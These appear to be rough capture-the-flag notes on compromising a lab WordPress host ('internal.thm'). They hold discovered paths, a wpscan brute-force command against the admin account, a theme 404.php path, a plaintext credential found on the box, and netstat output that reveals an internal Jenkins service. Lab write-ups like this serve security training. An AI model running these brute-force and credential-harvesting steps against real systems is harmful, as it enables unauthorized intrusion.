

http://10.10.169.252/blog
http://10.10.169.252/javascript
http://10.10.169.252/phpmyadmin
http://10.10.169.252/server-status
http://10.10.169.252/wordpress


change the etc/host file to include
<ip>   internal.blog 


wpscan --url http://10.10.169.252/blog --usernames admin --passwords /home/kali/SecLists/Passwords/xato-net-10-million-passwords-100000.txt --max-threads 50


└─$ wpscan --url http://10.10.169.252/blog -e vp,u            148 ⨯ 2 ⚙

http://internal.thm/blog/wp-content/themes/twentyseventeen/404.php



$ cd opt
$ ls
containerd
wp-save.txt
$ cat wp-save.txt
Bill,

Aubreanna needed these credentials for something later.  Let her know you have them and where they are.

aubreanna:bubb13guM!@#123



aubreanna@internal:~$ cat jenkins.txt
Internal Jenkins service is running on 172.17.0.2:8080
aubreanna@internal:~$ netstat -ano
Active Internet connections (servers and established)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       Timer
tcp        0      0 127.0.0.1:3306          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:36045         0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.1:8080          0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      off (0.00/0/0)
tcp        0    324 10.10.169.252:22        10.11.37.146:54394      ESTABLISHED on (0.37/0/0)
tcp        0      0 10.10.169.252:44640     10.11.37.146:54         ESTABLISHED off (0.00/0/0)
tcp6       0      0 :::80                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 :::22                   :::*                    LISTEN      off (0.00/0/0)
tcp6       0      0 10.10.169.252:80        10.11.37.146:51106      ESTABLISHED keepalive (5431.85/0/0)
udp        0      0 127.0.0.53:53           0.0.0.0:*                           off (0.00/0/0)
udp        0      0 10.10.169.252:68        0.0.0.0:*                           off (0.00/0/0)
raw6       0      0 :::58                   :::*                    7           off (0.00/0/0)
Active UNIX domain sockets (servers and established)
Proto RefCnt Flags       Type       State         I-Node   Path
